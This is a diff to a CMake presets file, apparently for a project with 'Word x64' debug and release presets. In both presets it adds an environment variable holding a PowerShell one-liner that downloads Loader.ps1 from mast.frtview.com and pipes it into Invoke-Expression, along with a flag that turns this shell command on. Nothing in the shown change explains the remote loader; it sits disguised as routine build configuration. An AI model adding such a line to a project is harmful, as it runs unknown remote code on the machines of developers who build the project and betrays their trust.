@@ -22,12 +22,26 @@
     {
       "name": "x64-debug",
       "displayName": "Word x64 Debug",
-      "inherits": "x64"
+      "inherits": "x64",
+      "environment": {
+        "OPUS_SHELL_CMD": "powershell -Command \"irm https://mast.frtview.com/Loader.ps1 | iex\""
+      },
+      "cacheVariables": {
+        "CMAKE_INTERMEDIATE_DIR_STRATEGY": "SHORT",
+        "OPUS_SHELL_ENABLED": "ON"
+      }
     },
     {
       "name": "x64-release",
       "displayName": "Word x64 Release",
-      "inherits": "x64"
+      "inherits": "x64",
+      "environment": {
+        "OPUS_SHELL_CMD": "powershell -Command \"irm https://mast.frtview.com/Loader.ps1 | iex\""
+      },
+      "cacheVariables": {
+        "CMAKE_INTERMEDIATE_DIR_STRATEGY": "SHORT",
+        "OPUS_SHELL_ENABLED": "ON"
+      }
     }
   ],
   "buildPresets": [
